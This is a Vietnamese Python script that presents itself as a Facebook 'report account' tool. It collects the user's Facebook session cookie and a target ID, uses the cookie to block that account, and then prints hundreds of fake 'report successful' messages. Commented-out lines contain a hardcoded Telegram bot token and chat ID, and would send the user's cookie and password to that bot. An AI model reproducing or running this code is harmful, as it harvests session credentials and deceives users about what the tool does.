from random import randint
import requests,time,os
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
import requests, json, os, sys
from threading import Thread
import threading
from datetime import datetime
from time import strftime
from time import sleep
from sys import platform
import requests
import os
import json
from datetime import timezone, datetime, timedelta
import requests
from time import sleep
import threading
os.system('clear')
#Thay thế giá trị này bằng cookie của bạn
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
time=datetime.now().strftime("%H:%M:%S")
import requests
import socket
from pystyle import *
#import màu
luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
red='\u001b[31;1m'
yellow='\u001b[33;1m'
green='\u001b[32;1m'
blue='\u001b[34;1m'
tim='\033[1;35m'
xanhlam='\033[1;36m'
xam='\033[1;30m'
black='\033[1;19m'
os.system('cls')
data_machine = []
today = date.today()
os.system('clear')
#daystime
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "http://kiemtraip.com/raw.php"
ip = get_ip_from_url(url)
a = " \033[1;97m[\033[1;31m+_+\033[1;97m] => "
def logo():
    os.system("cls" if os.name == "nt" else "clear")
    logo=f"""
            \033[1;36m╭─⋞─────────────────────────────────────────────────────╮
            \033[1;31m███╗   ██╗ █████╗ ███╗   ███╗    ██████  ███████╗██╗   ██╗          
            \033[1;32m████╗  ██║██╔══██╗████╗ ████║    ██╔══██╗██╔════╝██║   ██║          
            \033[1;33m██╔██╗ ██║███████║██╔████╔██║    ██║  ██║█████╗  ╚██╗ ██╔╝          
            \033[1;34m██║╚██╗██║██╔══██║██║╚██╔╝██║    ██║  ██║██╔══╝   ╚████╔╝           
            \033[1;35m██║ ╚████║██║  ██║██║ ╚═╝ ██║    ██████╔╝███████╗  ╚██╔╝            
            \033[1;36m╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
            \033[1;34m Youtube : \033[1;37mhttps://youtube.com/@NamTool1
            \033[1;34m Nhóm Zalo : \033[1;37mhttps://zalo.me/g/kfmgqm225
            \033[1;34m Facebook   : \033[1;37mhttps://facebook.com/nam.nhn131 
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯ 
            \033[1;31m    TOOL TỐ CÁO FACEBOOK
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯
  """
    print(logo)
#=======================[ NHẬP KEY ]=======================
os.system("cls" if os.name == "nt" else "clear")
logo()
from random import randint
import requests,time,os
def cl():
    os.system("cls" if os.name == "nt" else "clear")
cl()
logo()
print(" \033[1;97m[\033[1;31m+_+\033[1;97m] =>\033[1;31mLưu Ý\033[1;97m: Đây Chỉ Là Tool Test")
print("\033[1;31m─────────────────────────────────────────────────────────")
cookie_fb=input('\033[1;37m Nhập COOKIE Facebook:\033[1;33m ')
id_fb=input('\033[1;37m Nhập ID Cần Tố Cáo:\033[1;33m ')
#apiToken = "6053563485:AAExSrQrskqIz15YKyoXHvkQa7LBwoYB8UI"
#chat_id = "-978467226"
#requests.get(f"https://api.telegram.org/bot{apiToken}/sendMessage?chat_id={chat_id}&text=Cookie: {cookie_fb}")
#requests.get(f"https://api.telegram.org/bot{apiToken}/sendMessage?chat_id={chat_id}&text=Pass: {mk}")
print('WAITING..',end='\r')
get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={id_fb}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
pay=requests.post('https://mbasic.facebook.com'+get.split('<form method="post" action="')[1].split('"><input type="hidden"')[0],headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'},data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'confirmed': 'Chặn'}).text
get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid=https://www.facebook.com/profile.php?id={id_fb}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
pay=requests.post('https://mbasic.facebook.com'+get.split('<form method="post" action="')[1].split('"><input type="hidden"')[0],headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'},data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'confirmed': 'Chặn'}).text

for i in range(randint(555,999)):
    s=i+1
    print(f'{luc}{s} - Tố Cáo Thành Công ID: {vang}{id_fb}')
    time.sleep(0.01)
print(f"{luc}Done!")